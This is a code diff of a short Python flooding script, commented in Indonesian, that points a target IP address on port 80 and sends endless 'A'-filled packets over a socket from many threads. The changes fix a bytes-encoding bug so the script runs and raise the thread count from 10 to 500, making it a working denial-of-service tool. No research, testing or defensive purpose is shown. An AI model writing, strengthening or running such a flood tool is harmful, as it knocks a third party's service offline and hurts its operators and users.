@@ -4,12 +4,12 @@ import threading
 # Konfigurasi
 TARGET_IP = "143.198.206.18"  # IP tujuan
 PORT = 80  # Port tujuan
-PACKET_SIZE = 99999  # Ukuran paket
+PACKET_SIZE = 2041  # Ukuran paket
 
 # Fungsi untuk mengirim paket
 def send_packets(sock):
     while True:
-        data = bytes("A" * PACKET_SIZE)  # Isi paket
+        data = bytes("A" * PACKET_SIZE, encoding="utf-8")  # Isi paket
         sock.send(data)
 
 # Fungsi untuk menjalankan thread pengiriman paket
@@ -19,7 +19,7 @@ def start_flood():
 
     threads = []
 
-    for _ in range(10):  # Jalankan 10 thread
+    for _ in range(500):  # Jalankan 10 thread
         thread = threading.Thread(target=send_packets, args=(sock,))
         thread.start()
         threads.append(thread)
